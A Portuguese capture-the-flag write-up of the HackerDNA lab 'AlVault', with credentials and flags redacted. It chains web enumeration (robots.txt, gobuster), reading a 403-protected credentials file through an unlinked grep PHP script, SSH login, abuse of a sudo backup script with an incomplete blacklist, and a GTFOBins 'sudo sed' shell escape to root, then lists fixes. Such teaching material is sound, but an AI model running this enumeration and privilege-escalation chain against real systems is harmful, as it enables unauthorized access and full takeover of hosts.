# AlVault - Write-up (HackerDNA)

> De visitante anônimo até root, encadeando um 403 que não protege o arquivo e duas regras de sudo abertas demais.

| | |
|---|---|
| **Plataforma** | [HackerDNA](https://hackerdna.com) |
| **Lab** | [AlVault - https://hackerdna.com/labs/alvault](https://hackerdna.com/labs/alvault) |
| **Dificuldade** | Medium |
| **Técnicas** | Enumeração web, bypass de controle de acesso, brute-force de diretório, privilege escalation (sudo mal configurado + GTFOBins) |

> Nota: este write-up não traz valores de flag nem senhas. As credenciais e flags que apareciam nos prints foram censuradas (`REDACTED`). O conteúdo é pra estudo. Tudo foi feito em ambiente de laboratório autorizado.

---

## Sobre o lab

O AlVault é um host Linux rodando um site corporativo simples da fictícia "Cybersecurity Solutions Inc.". Comecei sem credencial nenhuma e terminei com shell de root. O que torna o lab interessante não é nenhum exploit complicado. São configurações que parecem seguras mas não são: um diretório "bloqueado" que continua legível por outro caminho, um script "desativado" que ninguém apagou, e duas permissões de sudo dadas com boa intenção que acabam entregando a máquina inteira.

## Resumo da cadeia

```
recon, robots.txt vaza /dev /backup /admin, wordlist maior acha file_search.php sem link
grep lê o credentials.txt que o 403 "protegia", senha SSH = flag de usuário
sudo backup.py arquiva o home do admin como root, pego a senha temporária do admin
su admin, sudo sed (GTFOBins), shell root = flag de root
```

A ideia que se repete o lab todo: proteger uma camada só (uma URL, um menu, uma blacklist) não protege o recurso que está embaixo dela. Dá pra contornar cada uma por um caminho de lado.

---

## 1. Reconhecimento

Comecei escaneando as portas pra ver o que o servidor tinha exposto.

```bash
nmap -sV -T4 <target-ip>
```

**O que cada parte faz:**
- `nmap`: scanner de portas e serviços, o padrão pra esse tipo de recon.
- `-sV`: além de dizer se a porta está aberta, tenta identificar qual software e versão responde nela.
- `-T4`: deixa o scan mais rápido (a escala de timing vai de 0 a 5), bom pra um lab.

Só duas portas abertas:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    nginx
```

A porta 80 (nginx) é o que interessa pra parte web, então é por ali que vou enumerar. A 22 (SSH) eu já deixo anotada, porque é por onde volto depois que achar alguma credencial. Esse é o padrão desse tipo de lab: a web vaza uma senha e o SSH vira o shell de verdade.

Abri o site no navegador e caí numa página institucional vazia. Nada linkado de interessante, o que já indica que o conteúdo que importa está em caminhos que ninguém aponta.

![Página inicial](images/01-site-home.png)
*Home vazia. Nada aqui aponta pro conteúdo que vou precisar achar.*

---

## 2. Olhando o robots.txt

O primeiro lugar que eu sempre checo num alvo web é o robots.txt. Ele serve pra pedir aos buscadores que não indexem certos caminhos, só que na prática acaba listando justamente os diretórios que o dono não queria que aparecessem.

```bash
curl -s http://<target-ip>/robots.txt
```

**O que cada parte faz:**
- `curl`: cliente HTTP de linha de comando, pra baixar o conteúdo de uma URL.
- `-s`: modo silencioso, esconde a barra de progresso e deixa só a resposta.

```
User-agent: *
Disallow: /dev/
Disallow: /backup/
Disallow: /admin/
```

![robots.txt](images/02-robots.png)
*Três diretórios que o dono quis esconder dos buscadores e acabou entregando.*

Na tentativa de esconder esses diretórios dos crawlers, o admin basicamente documentou pra qualquer visitante onde ficam as áreas sensíveis: dev, backup e admin.

---

## 3. Sondando os três caminhos

Com os três diretórios na mão, dá pra só anotar "bloqueado" e seguir, mas o certo é olhar como cada um está bloqueado, porque isso muda o que dá pra fazer. Sondei um de cada vez, olhando só o código HTTP.

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://<target-ip>/admin/
curl -s -o /dev/null -w '%{http_code}\n' http://<target-ip>/backup/
```

**O que cada parte faz:**
- `-o /dev/null`: joga o corpo da resposta (o HTML) fora. Não quero ver a página, só o status.
- `-w '%{http_code}\n'`: imprime só o código HTTP da resposta e pula linha.

| Caminho | Código | O que é | Dá pra explorar? |
|---|---|---|---|
| `/admin/` | `401` | Autenticação HTTP Basic (`.htpasswd`), pede usuário e senha. | Só com credencial |
| `/backup/` | `403` | Regra `deny all` do nginx, o servidor recusa servir essa URL. | Sim, por fora do HTTP |
| `/dev/` | aberto | Área de dev, acessível. | Sim, porta de entrada |

![admin 401](images/03-admin-401.png)
*/admin/ retorna 401, barreira de credencial.*

![backup 403](images/04-backup-403.png)
*/backup/ retorna 403, o nginx se recusa a servir a URL.*

> **Ponto importante:** o 403 parece mais forte que o 401, mas pra quem está atacando ele é mais fraco. O 401 é uma barreira de credencial. O 403 aqui é só uma regra do nginx sobre servir aquela URL por HTTP, e não diz nada sobre o arquivo em si. Se outro componente da máquina (um script PHP, por exemplo) ler esse mesmo arquivo direto do disco, o nginx nem fica sabendo. O `deny all` trava a porta da frente, não o cofre. Isso volta no passo 5.

---

## 4. A área /dev/ e o comentário no código-fonte

O /dev/ está aberto e mostra um "Developer Portal" com duas ferramentas: File Search Tool e File Upload Tool.

![Developer Portal](images/05-dev-portal.png)
*Área de dev acessível, com as duas ferramentas linkadas.*

Abri a File Search Tool (`search.php`). Qualquer busca devolve um `TRY HARDER!`, ou seja, essa versão é só isca e não busca nada. Mas três coisas nessa tela valem mais que a busca:

- Os placeholders dos campos (o texto cinza de exemplo) mostram o caminho que a ferramenta foi feita pra ler: `/var/www/html/backup` e `credentials.txt`. Juntando dá `/var/www/html/backup/credentials.txt`, que é o arquivo por trás do 403 do passo 3.
- O `TRY HARDER!` confirma que essa versão é só fachada.
- O comentário HTML no código-fonte (que dá pra ver com Ctrl+U) é o que abre o próximo passo.

![search.php e código-fonte](images/06-searchphp-source.png)
*Um print com três pistas: os placeholders com o caminho do arquivo, o TRY HARDER e, no DevTools, o comentário do dev.*

O comentário, traduzido: *remover a implementação antiga do arquivo de busca por causa dos achados da auditoria. Nota do Dave: desabilitei o acesso por enquanto, mas ainda não apaguei o arquivo, porque talvez a gente precise consultar a parte do grep pra versão nova.*

Lendo isso: existia uma ferramenta de busca de verdade, baseada em grep, que lê arquivos do disco. O Dave só tirou o link dela do portal, mas não apagou o arquivo. Então ele continua lá no servidor, com outro nome, sem nada apontando. Só preciso achar o nome.

---

## 5. Procurando o arquivo sem link

Pra achar um arquivo que ninguém linka, uso força bruta de nomes com o gobuster. Comecei pela wordlist comum, a menor:

```bash
gobuster dir -u http://<target-ip>/dev/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt
```

**O que cada parte faz:**
- `gobuster dir`: o gobuster no modo de diretórios e arquivos.
- `-u`: a URL alvo, aqui a pasta /dev/.
- `-w`: a wordlist com os nomes a testar. Comecei pela `common.txt`, que tem perto de 4,6 mil nomes.
- `-x php,txt`: testa cada palavra também com `.php` e `.txt` no final.

Resultado: `index.html`, `notes.txt`, `search.php` e `upload.php`. Tudo que o portal já linkava. A lista comum não achou nada novo.

![gobuster common](images/07-gobuster-common.png)
*14.253 tentativas e nada novo. Isso é um resultado, não um beco sem saída.*

Faz sentido: um arquivo que alguém escondeu de propósito dificilmente vai estar entre os 4,6 mil nomes mais comuns. "Não achei nada" aqui não quer dizer que não existe, quer dizer que preciso de uma lista maior. Troquei pela `directory-list-2.3-medium.txt`, que tem cerca de 220 mil entradas.

```bash
gobuster dir -u http://<target-ip>/dev/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt -t 20
```

**O que mudou:**
- `-w ...medium.txt`: agora a lista grande, umas 50 vezes maior.
- `-t 20`: 20 threads em paralelo, pra compensar o tamanho da lista.

Em alguns segundos apareceu o que faltava:

```
file_search.php      (Status: 200) [Size: 1310]
```

![gobuster medium](images/08-gobuster-medium.png)
*Depois de muitas requisições, o file_search.php aparece. É a implementação antiga que o Dave esqueceu de apagar.*

---

## 6. Lendo o arquivo "protegido" pelo 403, e a flag de usuário

O `file_search.php` é a implementação de verdade, com grep. Testando o comportamento dele, ele recebe um padrão de busca e roda no servidor algo mais ou menos assim:

```php
// dentro do file_search.php
$allowed_file = "/var/www/html/backup/credentials.txt";
$pattern = escapeshellarg($_POST['pattern']);   // sanitizado
$command = "grep -i $pattern $allowed_file 2>&1";
$output  = shell_exec($command);
```

> **Por que não dá command injection:** o `escapeshellarg()` coloca o input entre aspas simples e neutraliza `;`, `|`, `$()` e os outros metacaracteres de shell. Não tem injeção de comando aqui, então não vale gastar tempo tentando. O problema é outro: esse script lê o `credentials.txt` direto do disco com grep e ignora totalmente o `deny all` do nginx. É o que eu tinha anotado no passo 3 acontecendo na prática. O 403 nunca protegeu o arquivo, só a URL.

Como o `grep -i` imprime toda linha que casa com o padrão, um termo amplo como SSH já despeja as linhas de credencial:

```bash
curl -s -X POST http://<target-ip>/dev/file_search.php -d 'pattern=SSH'
```

**O que cada parte faz:**
- `-X POST`: usa o método POST (o formulário é `method="post"`).
- `-d 'pattern=SSH'`: manda o campo `pattern` (o nome que o PHP espera) com o valor SSH como termo de busca.

Na resposta vieram o usuário e a senha SSH (censurados aqui):

![credenciais SSH](images/09-ssh-creds.png)
*O "backup" era na prática um arquivo de credenciais em texto puro, com um login SSH no meio.*

### Entrando por SSH

Como `developer` é uma conta Linux de verdade, reusei a credencial pra pegar um shell.

```bash
ssh developer@<target-ip>
```

**O que cada parte faz:**
- `ssh`: cliente de SSH, abre a sessão remota autenticada.
- `developer@<target-ip>`: usuário e host, com qual conta e em qual máquina conectar.

> **Detalhe:** na primeira conexão o SSH pede pra confirmar o fingerprint do host (respondi `yes`) e, na hora de digitar a senha, não aparece nada na tela, nem asterisco. Isso é normal, não é travamento.

![login SSH](images/10-ssh-login.png)
*Prompt muda e aparece o "Welcome to AlVault!". Estou dentro como developer.*

Confirmei onde estava e peguei a primeira flag. Rodei `pwd` e `ls -la` antes, por hábito de documentar o passo.

```bash
pwd
ls -la
cat flag-user.txt
```

**O que cada parte faz:**
- `pwd`: mostra em qual pasta estou.
- `ls`: lista o diretório. O `-l` é o formato longo (permissões, dono, tamanho, data) e o `-a` inclui os arquivos ocultos (os que começam com ponto).
- `cat`: mostra o conteúdo de um arquivo.

![flag de usuário](images/11-user-flag.png)
*Flag de usuário capturada (valor censurado).*

**Flag de usuário capturada.**

---

## 7. Escalando privilégio, parte 1: blacklist furada (developer para admin)

Primeira coisa que faço depois de pegar um shell: ver o que essa conta pode rodar como outro usuário. O comando é o `sudo -l`.

```bash
sudo -l
```

**O que cada parte faz:**
- `sudo -l`: lista as regras de sudo que valem pra conta atual (o que pode rodar, como quem, e se pede senha).

```
User developer may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

**Lendo a regra:**
- `(ALL)`: posso rodar como qualquer usuário, root incluso.
- `NOPASSWD`: sem pedir senha.
- `/usr/bin/python3 /opt/backup.py`: o comando exato que a regra libera, rodar esse script como root.

![sudo -l developer](images/12-sudo-l-dev.png)
*O developer roda o backup.py como root, sem senha. É o caminho pra escalar.*

Nunca rodo como root um script sem ler antes, então abri o código.

```bash
cat /opt/backup.py
```

```python
RESTRICTED_DIRS = ["/", "/root", "/etc", "/bin", "/sbin", "/usr",
                   "/var", "/lib", "/lib64", "/dev", "/proc",
                   "/sys", "/run", "/boot"]

def backup_files(directory):
    directory = os.path.abspath(directory)
    if directory in RESTRICTED_DIRS:
        print("...not allowed for security reasons.")
        return
    ...
    backup_path = "/tmp/backup.tar.gz"
    os.system(f"tar -czf {backup_path} {directory}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        directory = input("Enter directory to backup: ")
        backup_files(directory)
    else:
        backup_files(sys.argv[1])
```

![backup.py](images/13-backup-py.png)
*Código do backup.py. Já dá pra ver que existe um usuário admin (/home/admin) além do developer.*

Três coisas que importam aqui:

- A linha vulnerável é o `os.system("tar -czf ... {directory}")`. Ele empacota com tar o diretório que eu escolher. Como chamo via sudo, esse tar roda como root, então lê arquivos que o developer não lê.
- A falha está na `RESTRICTED_DIRS`, que é uma blacklist. Os caminhos de sistema estão todos lá, mas o `/home` não está. Então posso arquivar o home de qualquer usuário, inclusive o do admin.
- Tem uma pegadinha de execução. Parece que dá pra passar o caminho como argumento (`sys.argv[1]`), mas a regra do sudoers é `/usr/bin/python3 /opt/backup.py` sem argumento. Uma regra assim casa só com a linha exata, então qualquer argumento extra fica de fora e o sudo recusa. A saída é rodar sem argumento e informar o caminho no `input()`, que o sudo não enxerga.

> **Blacklist x allow-list:** blacklist é uma lista do que é proibido, e ela sempre fica incompleta, porque basta esquecer um item. Aqui esqueceram o `/home`. Se fosse uma allow-list (listar só o que pode), esse buraco não existiria.

Confirmei o alvo dentro do home do admin:

```bash
ls -la /home/admin/
```

![ls /home/admin](images/14-ls-admin.png)
*A pasta admin_stuff está em 700 (drwx------), ilegível pro developer. É o que o tar como root vai contornar.*

Rodei o backup sem argumento, informando o caminho no prompt:

```bash
sudo /usr/bin/python3 /opt/backup.py
# Enter directory to backup: /home/admin/admin_stuff
```

![backup executado](images/15-backup-run.png)
*Rodou sem pedir senha. O aviso tar: removing leading '/' é normal, o tar só guarda os caminhos como relativos.*

Extraí o tarball em /tmp (como o próprio developer) e procurei o conteúdo:

```bash
tar -xzf /tmp/backup.tar.gz -C /tmp
ls -laR /tmp/home/admin/admin_stuff/
```

**O que cada parte faz:**
- `tar`: ferramenta de arquivo. `-x` extrai, `-z` descomprime gzip, `-f` indica o arquivo, `-C /tmp` extrai pra dentro de /tmp.
- `ls -laR`: o `-R` faz listar também as subpastas.

![extração](images/16-extract.png)
*Os arquivos extraídos saem com dono developer, aí já consigo ler. Dentro tem uma pasta oculta .secret com um timepass.txt.*

Li a nota:

```bash
cat /tmp/home/admin/admin_stuff/.secret/timepass.txt
```

![timepass.txt](images/17-timepass.png)
*A nota tem a senha temporária do admin em texto puro (valor censurado).*

> **Observação:** vale o comentário: a mesma nota fala em atualizar os sistemas e em novas políticas de segurança, e guarda a senha do admin num .txt. Outra coisa: a blacklist bloqueia o `/root` direto, então esse truque não arquiva a flag de root. Ele só me leva de lado, até o admin. Pra chegar em root ainda falta um segundo passo.

---

## 8. Escalando privilégio, parte 2: sudo sed pelo GTFOBins (admin para root)

Virei admin com a senha que achei e repeti a enumeração de sudo:

```bash
su admin
whoami
sudo -l
```

**O que cada parte faz:**
- `su admin`: troca a sessão pro usuário admin.
- `whoami`: confirma com qual usuário estou agora.

```
User admin may run the following commands on this host:
    (ALL) NOPASSWD: /bin/sed
```

![su admin e sudo -l](images/18-su-admin-sudo.png)
*Agora como admin, e dá pra rodar /bin/sed como root sem senha.*

> **Por que isso vira shell root:** o sed parece inofensivo (é um editor de texto de stream), mas tem um comando interno, o `e`, que executa comando de shell. Ele está no [GTFOBins](https://gtfobins.github.io/gtfobins/sed/), que é o catálogo de binários normais que dá pra abusar. Na prática, dar `sudo /bin/sed` é o mesmo que dar um shell de root. Valeria o mesmo pra `awk`, `find`, `vi`, `tar` e vários outros.

Usei o escape do GTFOBins:

```bash
sudo /bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

**O que cada parte faz:**
- `sudo /bin/sed`: roda o sed como root, que é o que a regra permite.
- `-n`: modo silencioso, não imprime as linhas sozinho.
- `'1e exec /bin/sh 1>&0'`: o truque em si. O `1` é "na linha 1", o `e <cmd>` executa um comando de shell, o `exec /bin/sh` troca o processo por um shell, e o `1>&0` liga a saída na entrada do terminal pra o shell ficar interativo.
- `/etc/hosts`: um arquivo legível qualquer, só pra dar um input válido pro sed processar.

![sed shell root](images/19-sed-shell.png)
*O prompt vira #, que é o sinal de shell root.*

Confirmei o privilégio e peguei a flag final:

```bash
id
cat /root/flag-root.txt
```

**O que cada parte faz:**
- `id`: mostra UID, GID e grupos. O `uid=0(root)` é a prova de que sou root.

```
uid=0(root) gid=0(root) groups=0(root)
```

![flag de root](images/20-root-flag.png)
*whoami retorna root. Máquina comprometida do começo ao fim (flag censurada).*

**Flag de root capturada.**

---

## 9. Como corrigir

- "Sem link" não é "inacessível". Tirar um script antigo de um menu não tira ele do disco. O certo é apagar o código mesmo, e não guardar segredo de produção num diretório servido pela web.
- Proteger o dado, não a URL. O `deny all` do nginx foi contornado por um PHP que lia o mesmo arquivo. O controle de acesso tem que estar no recurso (permissão de arquivo, um cofre de segredo), não só numa URL que aponta pra ele.
- Sudo com menos privilégio. NOPASSWD num script que arquiva qualquer caminho como root é perigoso. Melhor trocar a blacklist por uma allow-list com os diretórios exatos permitidos e baixar o privilégio dentro do próprio script.
- Não dar sudo em binário que abre shell. `sed`, `awk`, `find`, `vi`, `tar` e companhia conseguem abrir shell (está no GTFOBins). Dar `sudo /bin/sed` é praticamente dar `sudo /bin/sh`.
- Higiene de credencial. Não reusar a mesma senha entre a web e o SSH, não guardar senha em texto puro em "nota temporária", e trocar tudo que for parar num backup.

## 10. O que ficou de aprendizado

- Um 403 não é controle de permissão. Travar uma URL no servidor web não adianta se outro componente lê o mesmo arquivo do disco. O bug de verdade foi o `file_search.php` sem link, não o 403 que aparecia na cara.
- Vale enumerar o que ficou pra trás. O robots.txt deu os nomes das áreas, um comentário no código admitiu que um arquivo foi escondido e não apagado, e uma wordlist maior achou ele quando a comum não deu conta. Cada passo foi uma pista deixada pelos próprios defensores.
- Cadeia vale mais que bug solto. Ler um arquivo me deu um shell de usuário. Duas regras de sudo abertas demais e separadas (um tar como root que esqueceu o /home, e depois o sudo sed) transformaram isso em root. Por isso vale rodar o `sudo -l` em cada salto de privilégio.

---

*Write-up feito pra fins de estudo, em ambiente de laboratório autorizado ([HackerDNA](https://hackerdna.com/labs/alvault)). Todas as ações foram feitas contra o alvo do desafio AlVault.*
